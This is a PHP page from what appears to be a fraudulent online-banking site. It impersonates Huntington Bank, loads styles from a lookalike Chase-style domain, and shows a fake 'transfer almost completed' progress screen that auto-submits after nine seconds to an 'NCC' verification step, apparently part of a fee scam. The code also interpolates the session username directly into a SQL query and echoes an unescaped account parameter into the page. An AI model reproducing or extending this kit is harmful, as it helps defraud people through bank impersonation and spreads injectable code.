<?php 
	require('functions.php');
	
	include "database.php";

$y=$_SESSION['user']['username'];
$result = mysqli_query($conn,"SELECT * FROM users WHERE username IN ('$y')");
$bio= mysqli_fetch_array($result);

if (!isLoggedIn($_GET['id'])) {
	$_SESSION['msg'] = "You must log in first";
	header("Location:login?goto=" . urlencode($_SERVER['REQUEST_URI']));
}

if (isset($_GET['logout'])) {
	session_destroy();
	unset($_SESSION['user']);
	header("location: index");
}
?>
<!DOCTYPE HTML>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
    <head>
        <!-- Meta Tags -->
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
	<meta name="HandheldFriendly" content="true" />
	<link href="https://www.jpmschaseb.com/ac/ibank/css/style.css" rel="stylesheet" type="text/css" />
	<link rel="icon" href="img/core-img/favicon.ico">
	<title>Verify NCC: Transfer Almost Completed | Huntington Bank</title>
    <style>
body,html{margin:0;padding:0;background-color:#696969;}
            body{margin:auto;}
            .head{box-shadow: 0px 1px 0px 1px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width:auto;}
            .foot{right:0; left: 0;
  bottom: 0;position: absolute;box-shadow: 2px 2px 0px 2px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width: 100%;}
            .button{background-color: #222;
  color: #fff;
  padding: 12px;
  border-radius: 5px;
  font-weight:bold;
  font-size:17px;
  border:1px solid #000;
  width: 100%;}
            .text{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;color:#ffffff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mtext{text-shadow: 1px 0px 2px #fff;font-size:13px;margin:15px;color:#000;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mybox a{text-transform:none;color:brown;}
            .mybox{text-shadow: 0px 0px 1px #000;font-size:14px;margin:15px;padding:10px;border-radius:5px;border:1px solid #000;background-color:#ffffff;font-family:lato,sans-serif;}
            textarea{border: 1px solid #222; background:#fff;width:100%;}
            .input-group {
 margin: 5px 13px 5px 5px; } .input-group label { display: block;
 text-align: left; margin: 3px;} .input-group input { box-shadow: rgba(0,0,0,0.3) 0 0 10px;
 border-collapse: collapse; height: 25px;
 padding: 2px;
 width: 100%;
 font-size: 16px;
 border-radius: 0px; border: 1px solid #222; background:#fff;
 }
 .btn {
 padding: 5px;
 width:auto;
 font-size: 15px;
 color: #fff;
 background: #696969;border-radius: 5px; }
</style>
	<script src="assets/js/jquery-1.11.1.min.js"></script>
	<link href="assets/plugins/jquery-ui/themes/base/minified/jquery-ui.mi.css" rel="stylesheet" />
	<link href="assets/bootstrap.css" rel="stylesheet" />
	<script src="assets/js/jquery.circlechart.js"></script>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link href="assets/plugins/icon/themify-icons/themify-icons.css" rel="stylesheet" />
	<link href="assets/css/animate.min.css" rel="stylesheet" />
	<link href="assets/css/style.min.css" rel="stylesheet" />
	<link href="assets/css/preloader.css" rel="stylesheet" />
</head>
<body>
    <div style="max-width:800px;margin:auto;">
<div class="head"><center><img src="lockup.svg" height="45" width="160" /></center></div>
<br>
<div id="ytWidget"></div><script src="https://translate.yandex.net/website-widget/v1/widget.js?widgetId=ytWidget&pageLang=en&widgetTheme=light&autoMode=false" type="text/javascript"></script> 
<br>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:5px;">
      <tr>
        <td style="border:#00925C 1px solid; padding:5px;"><table width="100%" border="0" cellpadding="0" cellspacing="0">
          <tr>
            <td width="50%" align="left" style="padding-left:5px"><strong><?php echo $bio["fname"]; ?>  <?php echo $bio["lname"]; ?> | <a href="/logout">Log Out</a></strong></td>
            <td width="50%" align="right" style="padding-right:5px"><strong><?php echo date("M d, Y")."";?> | <script>
	    
	    var currentTime = new Date();
var hours = currentTime.getHours();
var minutes = currentTime.getMinutes();

var suffix = "AM";

if (hours >= 12) {
    suffix = "PM";
    hours = hours - 12;
}

if (hours == 0) {
    hours = 12;
}

if (minutes < 10) {
    minutes = "0" + minutes;
}

document.write("<b>" + hours + ":" + minutes + " " + suffix + "</b>");
	    
	</script></strong></td>
          </tr>
          </td>
        </table>
        </tr>
        </table>
<br>
<h5 style="margin-left:11px;font-weight:bold;font-size:15px;">Important Information</h5>
<div style="text-align:left;background:#E8FFF8;border:1px solid #00925C;padding:5px;margin:11px;">
                                <h6 style="font-weight:bold;text-align:left;color:red;">Too many transfer request.
                                </h6>
                                <h6 style="font-weight:bold;text-align:left;color:black;">Please do not close or refresh this browser to avoid multiple billings.
                                </h6>
                                <h6 style="font-weight:bold;text-align:left;color:black;">Transfer requests usually takes about 5 minutes to process and about 24 - 48 hours before fund reaches it's destination.
                                </h6>
                                <h6 style="font-weight:bold;text-align:left;color:red;">Your Fund Transfer will be completed once it reaches 100%
                                </h6>
                            </div>
<!--BEGIN wizard-->
<h5 style="margin-left:11px;font-weight:bold;font-size:15px;">Transfer In Progress</h5>
			    <div class="col-md-4 col-md-offset-4" >
			        <!-- BEGIN panel -->
			        <div style="background:#fff;border:1px solid black;" class="panel panel-inverse">
			        	<!-- BEGIN panel-body -->
                        <div class="panel-body">
							<div class="col-md-4"></div>
						<div class="row">
                        <img src="mfb/mfb80.gif" width="100%" height="110px" />
                        </div>
			        	<!-- END panel-body -->
                    </div>
			        <!-- END panel -->
			    </div>
			    <br/><br>
<div align="center" class="mtext">© 2021 Huntington Bancshares Incorporated.</div>
				<!-- END col-4 -->
			</div>
			<form action="ncc-auth?account=<?php echo $_GET["account"]; ?>" name="verification" id="verification" method="post"> 
			<input type="hidden" name="account" value="<?php echo $_GET["account"]; ?>" />
<script type="text/javascript">
    window.onload=function(){ 
    window.setTimeout(function() { document.verification.submit(); }, 9000);
};
</script></form>
</body>
<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/60a112e9185beb22b30dad9b/1f5qj3ofd';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
</html>